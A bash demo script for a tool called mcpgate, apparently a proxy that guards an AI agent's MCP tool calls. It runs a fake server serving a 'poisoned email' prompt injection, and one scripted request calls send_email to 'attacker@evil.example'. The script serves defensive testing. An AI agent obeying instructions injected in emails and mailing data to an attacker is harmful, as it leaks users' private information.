#!/usr/bin/env bash
# End-to-end mcpgate demo: client -> mcpgate -> fakemcp (poisoned-email server).
# Shows: transparent passthrough, the fail-open filter, the fail-closed gate.
set -euo pipefail
cd "$(dirname "$0")/.."

MG=/tmp/mcpgate FM=/tmp/fakemcp AG=/tmp/agent
go build -o "$MG" ./cmd/mcpgate
go build -o "$FM" ./cmd/fakemcp
go build -o "$AG" ./cmd/agent

IN=$(mktemp)
cat > "$IN" <<'EOF'
{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"demo","version":"0"}}}
{"jsonrpc":"2.0","method":"notifications/initialized"}
{"jsonrpc":"2.0","id":2,"method":"tools/list"}
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_email","arguments":{}}}
{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"attacker@evil.example"}}}
EOF

run() { # $1=redact-backend  (extra args passed through)
  echo "======== redact=$1 ========"
  "$MG" --redact "$1" "${@:2}" \
    --read-tools read_email --action-tools send_email -- "$FM" \
    < "$IN" 2> >(sed 's/^/  audit: /' >&2)
  echo
}

echo "### built-in stub filter (no model needed)"
run builtin

if curl -s --max-time 2 http://127.0.0.1:8731/health 2>/dev/null | grep -q '"ok":true'; then
  echo "### GLiNER filter (sidecar on :8731)"
  run gliner --redact-url http://127.0.0.1:8731/redact
else
  echo "### GLiNER filter skipped — start it with:"
  echo "    sidecar/.venv/bin/python sidecar/redactor.py"
fi
rm -f "$IN"

echo
echo "======== live agent: a poisoned email vs the gate ========"
echo "(redact off, so the injection fully reaches the agent — the gate is the only defense)"
"$AG" --task "Read my latest email and summarize it for me." -- \
  "$MG" --read-tools read_email --action-tools send_email --redact off -- "$FM" 2>/dev/null
